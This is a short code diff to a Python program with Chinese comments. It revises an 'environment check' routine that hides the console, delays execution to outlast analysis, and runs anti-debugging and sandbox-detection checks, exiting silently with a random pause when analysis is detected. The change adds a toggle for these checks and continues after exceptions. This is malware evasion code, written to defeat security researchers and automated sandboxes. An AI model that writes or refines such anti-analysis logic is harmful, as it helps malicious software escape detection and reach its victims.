@@ -248,29 +248,38 @@ def analysis_delay(delay_seconds=30):
         time.sleep(delay_seconds)
 
 
-def comprehensive_environment_check(silent_delay=30):
-    """综合环境检查"""
+def comprehensive_environment_check(silent_delay=30, strict_mode=True):
+    """综合环境检查（增加可配置性）
+    
+    Args:
+        silent_delay: 延迟时间（秒）
+        strict_mode: 严格模式，False时降低检测强度
+    """
     try:
         # 隐藏控制台
         hide_console()
         
-        # 初始延迟
-        analysis_delay(silent_delay)
+        # 初始延迟（可配置）
+        if silent_delay > 0:
+            analysis_delay(silent_delay)
         
-        # 反调试检测
-        if not anti_debug_checks():
+        # 反调试检测（严格模式下启用）
+        if strict_mode and not anti_debug_checks():
             # 执行无害操作并退出
             time.sleep(random.uniform(10, 30))
             sys.exit(0)
         
-        # 沙箱检测
-        if not advanced_sandbox_detection():
+        # 沙箱检测（严格模式下启用）
+        if strict_mode and not advanced_sandbox_detection():
             # 执行无害操作并退出
             time.sleep(random.uniform(10, 30))
             sys.exit(0)
         
         return True
     except:
+        # 在非严格模式下，异常时继续执行
+        if not strict_mode:
+            return True
         return False
 
 
